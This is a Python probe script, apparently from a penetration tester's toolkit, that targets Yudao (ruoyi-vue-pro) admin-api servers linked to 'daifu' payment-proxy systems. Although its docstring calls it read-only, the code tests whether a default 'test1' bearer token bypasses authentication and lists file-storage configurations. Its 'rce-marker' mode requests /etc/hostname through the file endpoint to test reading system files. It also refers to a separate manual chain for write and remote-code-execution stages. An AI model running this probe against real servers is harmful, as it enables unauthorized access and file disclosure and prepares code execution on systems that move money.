#!/usr/bin/env python3
"""Yudao (ruoyi-vue-pro) daifu surface probe: read-only recon/mock/file checks.

Does not create/update file configs, upload files, place markers, or call
money-moving daifu endpoints. Only GETs documented admin-api surfaces and
writes a case artifact. Use the card's manual chain for write/RCE stages.
"""
from __future__ import annotations

import argparse
import json
import ssl
import urllib.error
import urllib.request
from pathlib import Path
from typing import Any
from urllib.parse import urljoin, urlparse

CASES = Path("/root/cases")
MASK = ("secret", "password", "token", "privateKey", "appSecret")


def fetch(url: str, headers: dict[str, str], timeout: float, insecure: bool) -> tuple[int, str]:
    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0", **headers})
    ctx = ssl._create_unverified_context() if insecure else None
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            return r.status, r.read(200000).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(50000).decode("utf-8", "replace")
    except Exception as e:
        return 0, str(e)


def envelope(text: str) -> dict:
    try:
        data = json.loads(text)
    except Exception:
        return {}
    return data if isinstance(data, dict) else {}


def redact(obj):
    if isinstance(obj, dict):
        return {k: ("[REDACTED]" if any(s.lower() in k.lower() for s in MASK) else redact(v))
                for k, v in obj.items()}
    if isinstance(obj, list):
        return [redact(v) for v in obj]
    return obj


def main() -> int:
    ap = argparse.ArgumentParser(description="Yudao daifu read-only surface probe")
    ap.add_argument("mode", choices=["recon", "mock", "file", "rce-marker"])
    ap.add_argument("--base", required=True, help="https://authorized-host")
    ap.add_argument("--case", "-c")
    ap.add_argument("--tenant", default="1")
    ap.add_argument("--token", default="test1")
    ap.add_argument("--timeout", type=float, default=10)
    ap.add_argument("--insecure", action="store_true")
    args = ap.parse_args()

    base = args.base.rstrip("/") + "/"
    host = (urlparse(base).hostname or "").lower()
    if not host:
        print("[scope] invalid base")
        return 2
    headers = {"Accept": "application/json", "tenant-id": args.tenant}
    if args.mode in ("mock", "file", "rce-marker"):
        headers["Authorization"] = f"Bearer {args.token}"

    endpoints = {
        "root": urljoin(base, "admin-api/"),
        "profile": urljoin(base, "admin-api/system/user/profile/get"),
        "file_configs": urljoin(base, "admin-api/infra/file-config/page?pageNo=1&pageSize=10"),
    }
    out: dict[str, Any] = {"base": base, "host": host, "mode": args.mode, "checks": {}}
    for name, url in endpoints.items():
        status, text = fetch(url, headers, args.timeout, args.insecure)
        env = envelope(text)
        item = {"status": status, "bytes": len(text), "envelope": bool(env),
                "code": env.get("code"), "msg": env.get("message") or env.get("msg")}
        if name == "profile":
            item["data_keys"] = sorted(env.get("data", {}).keys()) if isinstance(env.get("data"), dict) else []
        out["checks"][name] = item
        print(f"[{name}] HTTP {status} envelope={bool(env)} code={env.get('code')}")

    if args.mode == "mock":
        _, text = fetch(endpoints["profile"], headers, args.timeout, args.insecure)
        env = envelope(text)
        data = redact(env.get("data"))
        out["mock"] = {"accepted": bool(env.get("code") == 0 and env.get("data")), "profile": data}
        print(f"[mock] Bearer {args.token} accepted={out['mock']['accepted']}")

    if args.mode in ("file", "rce-marker"):
        _, text = fetch(endpoints["file_configs"], headers, args.timeout, args.insecure)
        env = envelope(text)
        rows = env.get("data", {}).get("list", []) if isinstance(env.get("data"), dict) else []
        configs = []
        for row in rows[:10] if isinstance(rows, list) else []:
            if not isinstance(row, dict):
                continue
            cfg = row.get("config") or {}
            configs.append({"id": row.get("id"), "name": row.get("name"), "storage": row.get("storage"),
                            "basePath": cfg.get("basePath") if isinstance(cfg, dict) else None,
                            "domain": cfg.get("domain") if isinstance(cfg, dict) else None})
        out["file_configs"] = configs
        print(f"[file] configs={len(configs)}")

    if args.mode == "rce-marker" and out.get("file_configs"):
        # Read-only marker check: try the first config id with a single path segment.
        cid = out["file_configs"][0].get("id")
        marker = urljoin(base, f"admin-api/infra/file/{cid}/get/etc/hostname")
        status, text = fetch(marker, headers, args.timeout, args.insecure)
        out["marker"] = {"url": marker, "status": status, "preview": text[:120]}
        print(f"[rce-marker] HTTP {status} preview={text[:60]!r}")

    if args.case:
        case = Path(args.case) if Path(args.case).is_absolute() else CASES / args.case
        (case / "artifacts").mkdir(parents=True, exist_ok=True)
        path = case / "artifacts/yudao_daifu_probe.json"
        path.write_text(json.dumps(out, ensure_ascii=False, indent=2), encoding="utf-8")
        print(f"[case] {path}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
